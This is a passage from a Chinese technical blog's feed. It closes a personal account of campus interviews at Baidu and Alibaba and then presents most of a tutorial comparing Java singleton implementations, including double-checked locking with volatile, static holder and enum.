&lt;p&gt;另一次面试是网页搜索部的架构团队，接到通知时我解释已经面过其他部门了，然而还是要求我去参加面试，无奈就当积累经验了。面试当天正好是百度的 Summer Party ，心里总想着赶紧面完去见下李彦宏和张杰…一面二面的内容都差不多，印象比较深刻的是手写了 MapReduce，考了 HTTP 协议内容，数据库索引底层实现等等。三面与 Rank 团队的三面内容差不多，更多是他一直在说，说到他们最近在开发的存储架构，说到百度开源文化与阿里的差距。&lt;/p&gt;
&lt;p&gt;百度面试的好处是一天全部面完，很痛快，不像阿里那样战线拉地老长。不过连着面四五个小时确实是够累的。面完一星期后，在公交车上连续接到两个百度 HR 的电话，通知已经通过了部门的面试。&lt;/p&gt;
&lt;h2 id=&quot;阿里终面&quot;&gt;&lt;a href=&quot;#阿里终面&quot; class=&quot;headerlink&quot; title=&quot;阿里终面&quot;&gt;&lt;/a&gt;阿里终面&lt;/h2&gt;&lt;p&gt;预约的9月22号早上11点的场，提前半小时到了那，第一次被如此火爆的招聘现场给震惊到了。反正是比预约时间晚了一小时才面上… 阿里的工作人员和面试官们真是辛苦了！&lt;/p&gt;
&lt;h3 id=&quot;三面&quot;&gt;&lt;a href=&quot;#三面&quot; class=&quot;headerlink&quot; title=&quot;三面&quot;&gt;&lt;/a&gt;三面&lt;/h3&gt;&lt;p&gt;三面应该是传说中的交叉面吧，其实就是工作人员随机地帮我选一个面试官。面试官长地特像非诚勿扰的孟非，笑起来真是一模一样，特有喜感。所以整个面试经过是我经历过的最轻松的。一上来，面试官就和我聊家乡和意向工作地点，又跟我抱怨后悔当初没选杭州。之后就进入正题开始让我自我介绍，然后一个个讨论我的项目，后来他分析说我的项目只能说一般。然后他说，我考你道题吧，他模拟出当时遇到的一个有关 mysql 索引的问题，结果我答错了。然后又问我能说说 Java 内存管理的东西吗，我就开始说“ Java 堆内存分为新生代、老年代…”就被他打住了。他说不用说了，一般人连这两个都不清楚。真是汗啊。然后就给我说他们面试主要考察这几方面的内容：基础能力（这部分很不错），项目/论文能力（这部分一般），对技术的热情（很不错），对未来工作的具体打算，对新技术/开源项目的了解程度。所以后面就主要讨论后两部分的内容。最后评分的时候“孟非”说给你A吧！您还真是一点都不隐藏啊。&lt;/p&gt;
&lt;h3 id=&quot;四面&quot;&gt;&lt;a href=&quot;#四面&quot; class=&quot;headerlink&quot; title=&quot;四面&quot;&gt;&lt;/a&gt;四面&lt;/h3&gt;&lt;p&gt;三面结束后被带到等候区等待结果。看到不断有简历拿进来，每念到一个名字就让回家，真是够残酷的。这时候已经中午了，吃完免费午餐后进入第四面。本以为第四面是HR面，结果还是技术面。面试官是一个不苟言笑的技术大牛，虽然我极力想让面试气氛轻松下来，还是感觉面试的气压很低。四面官对于每一个技术细节都问的很深入，聊项目时深入到写出算法代码，聊 JVM 时要求讲出7种垃圾收集器及其原理，讲到 CMS 收集器时要求说出其工作过程以及针对停顿的优化方案。最后也问了和三面相似的问题，对于一些开源项目的了解。而从面试官脸上完全看不出答得好坏，这更让我心虚了。&lt;/p&gt;
&lt;h3 id=&quot;五面（HR面）&quot;&gt;&lt;a href=&quot;#五面（HR面）&quot; class=&quot;headerlink&quot; title=&quot;五面（HR面）&quot;&gt;&lt;/a&gt;五面（HR面）&lt;/h3&gt;&lt;p&gt;四面结束后还是回到等候区等待，这回学聪明了，刷新了一下个人主页发现四面通过了。等了有一会儿终于被拉到 HR 场子面最后一轮了。阿里的 HR 拥有生死判决的能力，所以对于阿里 HR 面大家总是人心惶惶的。HR 面试官一边问我问题，一边在纸上做笔记，有种在做笔供的错觉。HR 的问题动不动就要我回答出三点，这可真是有些难着我了。&lt;/p&gt;
&lt;p&gt;面完HR面后，心里反倒不像之前那么自信了。看了个人主页上的状态变成“面试结束”，更是让人心情沉重起来。因为之前有好多挂在了这个状态上的同学。逛了各大 bbs 后发现好多人都是这个状态，看来自己真的成了云备胎了。&lt;/p&gt;
&lt;p&gt;经过五天的漫长的煎熬和等待，终于在26号晚上接到了HR的电话通知参加 offer party 。至此，悬着的心终于放下了。找工作的任务也算是圆满结束了。&lt;/p&gt;
&lt;h2 id=&quot;小记&quot;&gt;&lt;a href=&quot;#小记&quot; class=&quot;headerlink&quot; title=&quot;小记&quot;&gt;&lt;/a&gt;小记&lt;/h2&gt;&lt;p&gt;百度今年研发工资有了普调，给出的薪水非常有竞争力，再加上后面的4S计划，还是很令人心动的。然，阿里给了A offer，薪水上还是要高于百度，更重要的是阿里是我梦寐以求的公司，其部门团队、工作地点、生活质量都更合我的心意。所以，辛苦百度 HR 姐姐的开导了。&lt;/p&gt;
&lt;h2 id=&quot;冥冥之中，自有注定&quot;&gt;&lt;a href=&quot;#冥冥之中，自有注定&quot; class=&quot;headerlink&quot; title=&quot;冥冥之中，自有注定&quot;&gt;&lt;/a&gt;冥冥之中，自有注定&lt;/h2&gt;&lt;p&gt;我相信事在人为，但一切又像是冥冥之中自有注定一样。我是非常非常幸运的，所以我会感谢我遇到的所有挫折与顺利。如果当初实习生面试通过了，我可能会去杭州实习，少了我的支持与帮助女朋友很可能进不了阿里，我们也不可能一起成为双职工；如果当初内推简历太顺利，我可能进的就不是最希望的中间件了；如果当初没错过HR电话，参加了提前批终面，少了这一个月的缓冲，我可能就拿不了 A 评级。所以当遇到不顺的事情时，不必伤心抑郁，这可能是为了一些发生更好的事情。&lt;/p&gt;
&lt;p&gt;如果你正在发生一些不顺的事情，把她当做一种财富吧，相信通过不懈的奋斗和努力，最终都能拿到好 offer 的！&lt;/p&gt;
&lt;p&gt;-EOF-&lt;/p&gt;
</content>
    
    <summary type="html">
    
      马上就国庆假期了，自己的找工作历程也算是告一段落了。回首过往，这一路来的坎坎坷坷也算是颇为励志了，遂将心路历程一 一记载下来，希望能与大家共勉！希望能与大家共勉！本想写成一篇软文的，结果写着写着发现越写越像面经了，叹气！目前参加面试的公司不多只有百度和阿里，拿到的offer也只有百度网页搜索部的 Rank 团队和架构团队，阿里共享业务事业部中间件团队。
    
    </summary>
    
      <category term="职场生涯" scheme="http://wuchong.me/categories/%E8%81%8C%E5%9C%BA%E7%94%9F%E6%B6%AF/"/>
    
    
      <category term="生活" scheme="http://wuchong.me/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="面经" scheme="http://wuchong.me/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>如何正确地写出单例模式</title>
    <link href="http://wuchong.me/blog/2014/08/28/how-to-correctly-write-singleton-pattern/"/>
    <id>http://wuchong.me/blog/2014/08/28/how-to-correctly-write-singleton-pattern/</id>
    <published>2014-08-28T08:43:39.000Z</published>
    <updated>2016-03-08T12:12:13.000Z</updated>
    
    <content type="html">&lt;p&gt;单例模式算是设计模式中最容易理解，也是最容易手写代码的模式了吧。但是其中的坑却不少，所以也常作为面试题来考。本文主要对几种单例写法的整理，并分析其优缺点。很多都是一些老生常谈的问题，但如果你不知道如何创建一个线程安全的单例，不知道什么是双检锁，那这篇文章可能会帮助到你。&lt;/p&gt;
&lt;h2 id=&quot;懒汉式，线程不安全&quot;&gt;&lt;a href=&quot;#懒汉式，线程不安全&quot; class=&quot;headerlink&quot; title=&quot;懒汉式，线程不安全&quot;&gt;&lt;/a&gt;懒汉式，线程不安全&lt;/h2&gt;&lt;p&gt;当被问到要实现一个单例模式时，很多人的第一反应是写出如下的代码，包括教科书上也是这样教我们的。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Singleton&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Singleton instance;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Singleton&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Singleton &lt;span class=&quot;title&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (instance == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         instance = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Singleton();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; instance;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这段代码简单明了，而且使用了懒加载模式，但是却存在致命的问题。当有多个线程并行调用 getInstance() 的时候，就会创建多个实例。也就是说在多线程下不能正常工作。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;懒汉式，线程安全&quot;&gt;&lt;a href=&quot;#懒汉式，线程安全&quot; class=&quot;headerlink&quot; title=&quot;懒汉式，线程安全&quot;&gt;&lt;/a&gt;懒汉式，线程安全&lt;/h2&gt;&lt;p&gt;为了解决上面的问题，最简单的方法是将整个 getInstance() 方法设为同步（synchronized）。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;synchronized&lt;/span&gt; Singleton &lt;span class=&quot;title&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (instance == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        instance = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Singleton();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; instance;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;虽然做到了线程安全，并且解决了多实例的问题，但是它并不高效。因为在任何时候只能有一个线程调用 getInstance() 方法。但是同步操作只需要在第一次调用时才被需要，即第一次创建单例实例对象时。这就引出了双重检验锁。&lt;/p&gt;
&lt;h2 id=&quot;双重检验锁&quot;&gt;&lt;a href=&quot;#双重检验锁&quot; class=&quot;headerlink&quot; title=&quot;双重检验锁&quot;&gt;&lt;/a&gt;双重检验锁&lt;/h2&gt;&lt;p&gt;双重检验锁模式（double checked locking pattern），是一种使用同步块加锁的方法。程序员称其为双重检查锁，因为会有两次检查 &lt;code&gt;instance == null&lt;/code&gt;，一次是在同步块外，一次是在同步块内。为什么在同步块内还要再检验一次？因为可能会有多个线程一起进入同步块外的 if，如果在同步块内不进行二次检验的话就会生成多个实例了。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Singleton &lt;span class=&quot;title&quot;&gt;getSingleton&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (instance == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;                         &lt;span class=&quot;comment&quot;&gt;//Single Checked&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;synchronized&lt;/span&gt; (Singleton.class) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (instance == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;                 &lt;span class=&quot;comment&quot;&gt;//Double Checked&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                instance = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Singleton();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; instance ;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这段代码看起来很完美，很可惜，它是有问题。主要在于&lt;code&gt;instance = new Singleton()&lt;/code&gt;这句，这并非是一个原子操作，事实上在 JVM 中这句话大概做了下面 3 件事情。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;给 instance 分配内存&lt;/li&gt;
&lt;li&gt;调用 Singleton 的构造函数来初始化成员变量&lt;/li&gt;
&lt;li&gt;将instance对象指向分配的内存空间（执行完这步 instance 就为非 null 了）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但是在 JVM 的即时编译器中存在指令重排序的优化。也就是说上面的第二步和第三步的顺序是不能保证的，最终的执行顺序可能是 1-2-3 也可能是 1-3-2。如果是后者，则在 3 执行完毕、2 未执行之前，被线程二抢占了，这时 instance 已经是非 null 了（但却没有初始化），所以线程二会直接返回 instance，然后使用，然后顺理成章地报错。&lt;/p&gt;
&lt;p&gt;我们只需要将 instance 变量声明成 volatile 就可以了。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Singleton&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Singleton instance; &lt;span class=&quot;comment&quot;&gt;//声明成 volatile&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Singleton&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Singleton &lt;span class=&quot;title&quot;&gt;getSingleton&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (instance == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;                         &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;synchronized&lt;/span&gt; (Singleton.class) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (instance == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;       &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    instance = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Singleton();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; instance;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;有些人认为使用 volatile 的原因是可见性，也就是可以保证线程在本地不会存有 instance 的副本，每次都是去主内存中读取。但其实是不对的。使用 volatile 的主要原因是其另一个特性：禁止指令重排序优化。也就是说，在 volatile 变量的赋值操作后面会有一个内存屏障（生成的汇编代码上），读操作不会被重排序到内存屏障之前。比如上面的例子，取操作必须在执行完 1-2-3 之后或者 1-3-2 之后，不存在执行到 1-3 然后取到值的情况。从「先行发生原则」的角度理解的话，就是对于一个 volatile 变量的写操作都先行发生于后面对这个变量的读操作（这里的“后面”是时间上的先后顺序）。&lt;/p&gt;
&lt;p&gt;但是特别注意在 Java 5 以前的版本使用了 volatile 的双检锁还是有问题的。其原因是 Java 5 以前的 JMM （Java 内存模型）是存在缺陷的，即时将变量声明成 volatile 也不能完全避免重排序，主要是 volatile 变量前后的代码仍然存在重排序问题。这个 volatile 屏蔽重排序的问题在 Java 5 中才得以修复，所以在这之后才可以放心使用 volatile。&lt;/p&gt;
&lt;p&gt;相信你不会喜欢这种复杂又隐含问题的方式，当然我们有更好的实现线程安全的单例模式的办法。&lt;/p&gt;
&lt;h2 id=&quot;饿汉式-static-final-field&quot;&gt;&lt;a href=&quot;#饿汉式-static-final-field&quot; class=&quot;headerlink&quot; title=&quot;饿汉式 static final field&quot;&gt;&lt;/a&gt;饿汉式 static final field&lt;/h2&gt;&lt;p&gt;这种方法非常简单，因为单例的实例被声明成 static 和 final 变量了，在第一次加载类到内存中时就会初始化，所以创建实例本身是线程安全的。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Singleton&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//类加载时就初始化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; Singleton instance = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Singleton();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Singleton&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Singleton &lt;span class=&quot;title&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; instance;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这种写法如果完美的话，就没必要在啰嗦那么多双检锁的问题了。缺点是它不是一种懒加载模式（lazy initialization），单例会在加载类后一开始就被初始化，即使客户端没有调用 getInstance()方法。饿汉式的创建方式在一些场景中将无法使用：譬如 Singleton 实例的创建是依赖参数或者配置文件的，在 getInstance() 之前必须调用某个方法设置参数给它，那样这种单例写法就无法使用了。 &lt;/p&gt;
&lt;h2 id=&quot;静态内部类-static-nested-class&quot;&gt;&lt;a href=&quot;#静态内部类-static-nested-class&quot; class=&quot;headerlink&quot; title=&quot;静态内部类 static nested class&quot;&gt;&lt;/a&gt;静态内部类 static nested class&lt;/h2&gt;&lt;p&gt;我比较倾向于使用静态内部类的方法，这种方法也是《Effective Java》上所推荐的。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Singleton&lt;/span&gt; &lt;/span&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SingletonHolder&lt;/span&gt; &lt;/span&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; Singleton INSTANCE = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Singleton();  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Singleton&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; Singleton &lt;span class=&quot;title&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; SingletonHolder.INSTANCE; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这种写法仍然使用JVM本身机制保证了线程安全问题；由于 SingletonHolder 是私有的，除了 getInstance() 之外没有办法访问它，因此它是懒汉式的；同时读取实例的时候不会进行同步，没有性能缺陷；也不依赖 JDK 版本。&lt;/p&gt;
&lt;h2 id=&quot;枚举-Enum&quot;&gt;&lt;a href=&quot;#枚举-Enum&quot; class=&quot;headerlink&quot; title=&quot;枚举 Enum&quot;&gt;&lt;/a&gt;枚举 Enum&lt;/h2&gt;&lt;p&gt;用枚举写单例实在太简单了！这也是它最大的优点。下面这段代码就是声明枚举实例的通常做法。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;enum&lt;/span&gt; EasySingleton&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    INSTANCE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们可以通过EasySingleton.INSTANCE来访问实例，这比调用getInstance()方法简单多了。创建枚举默认就是线程安全的，所以不需要担心double checked locking，而且还能防止反序列化导致重新创建新的对象。但是还是很少看到有人这样写，可能是因为不太熟悉吧。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;一般来说，单例模式有五种写法：懒汉、饿汉、双重检验锁、静态内部类、枚举。上述所说都是线程安全的实现，文章开头给出的第一种方法不算正确的写法。&lt;/p&gt;
&lt;p&gt;就我个人而言，一般情况下直接使用饿汉式就好了，如果明确要求要懒加载（lazy initialization）会倾向于使用静态内部类，如果涉及到反序列化创建对象时会试着使用枚举的方式来实现单例。&lt;/p&gt;
&lt;h2 id=&quot;Read-More&quot;&gt;&lt;a href=&quot;#Read-More&quot; class=&quot;headerlink&quot; title=&quot;Read More&quot;&gt;&lt;/a&gt;Read More&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://javarevisited.blogspot.sg/2014/05/double-checked-locking-on-singleton-in-java.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Double Checked Locking on Singleton Class in Java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://javarevisited.blogspot.sg/2012/07/why-enum-singleton-are-better-in-java.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Why Enum Singleton are better in Java&lt;/a&gt;&lt;/li&gt;
